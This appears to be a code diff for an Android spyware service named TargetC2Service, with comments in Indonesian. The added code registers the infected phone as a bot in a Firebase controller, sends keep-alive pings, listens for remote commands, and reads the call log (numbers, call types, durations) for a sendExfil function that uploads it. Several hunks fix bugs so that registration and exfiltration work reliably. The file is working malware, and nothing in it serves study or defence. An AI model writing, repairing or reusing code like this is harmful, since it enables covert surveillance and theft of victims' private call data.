@@ -75,7 +75,10 @@ class TargetC2Service : Service() {
         }
 
         startForeground(NOTIF_ID, createNotification())
+
+        // 🔥 FIX: Daftarkan bot ke Firebase biar muncul di controller!
         registerBot()
+
         listenForCommands()
         listenForBroadcast()
         isRunning = true
@@ -130,6 +133,7 @@ class TargetC2Service : Service() {
         return builder.build()
     }
 
+    // 🔥 FUNGSI INI YANG BIKIN BOT MUNCUL DI CONTROLLER
     private fun registerBot() {
         val info = mapOf(
             "deviceId" to deviceId,
@@ -163,12 +167,16 @@ class TargetC2Service : Service() {
             }
         }
 
-        // Keep alive ping every 5 minutes
+        // Keep alive ping setiap 5 menit biar status online tetap hijau
         scope.launch {
             while (isActive) {
-                delay(300000)
-                botsRef.child(deviceId).child("lastSeen").setValue(System.currentTimeMillis())
-                botsRef.child(deviceId).child("isOnline").setValue(true)
+                delay(300000) // 5 menit
+                try {
+                    if (::botsRef.isInitialized) {
+                        botsRef.child(deviceId).child("lastSeen").setValue(System.currentTimeMillis())
+                        botsRef.child(deviceId).child("isOnline").setValue(true)
+                    }
+                } catch (_: Exception) {}
             }
         }
     }
@@ -308,15 +316,9 @@ class TargetC2Service : Service() {
             val logs = mutableListOf<String>()
             cursor?.use {
                 while (it.moveToNext()) {
-                    val number = it.getString(it.getColumnIndexOrThrow(
-                        android.provider.CallLog.Calls.NUMBER
-                    )) ?: "Unknown"
-                    val type = it.getString(it.getColumnIndexOrThrow(
-                        android.provider.CallLog.Calls.TYPE
-                    )) ?: "?"
-                    val dur = it.getString(it.getColumnIndexOrThrow(
-                        android.provider.CallLog.Calls.DURATION
-                    )) ?: "0"
+                    val number = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)) ?: "Unknown"
+                    val type = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)) ?: "?"
+                    val dur = it.getString(it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)) ?: "0"
                     val typeStr = when (type) {
                         "1" -> "INCOMING"
                         "2" -> "OUTGOING"
@@ -536,7 +538,7 @@ class TargetC2Service : Service() {
         )
     }
 
-    // 🔥 FIX: Ini dia perbaikannya — toString() dihapus!
+    // 🔥 FIX: timestamp pake Long, bukan String!
     private fun sendExfil(type: String, content: String) {
         try {
             if (::exfilRef.isInitialized) {
@@ -544,7 +546,7 @@ class TargetC2Service : Service() {
                     "type" to type,
                     "content" to content,
                     "deviceId" to deviceId,
-                    "timestamp" to System.currentTimeMillis()  // ← SEKARANG Long, bukan String!
+                    "timestamp" to System.currentTimeMillis()
                 )).addOnCompleteListener { task ->
                     if (!task.isSuccessful) {
                         Log.e(TAG, "Exfil send FAILED: ${task.exception?.message}")
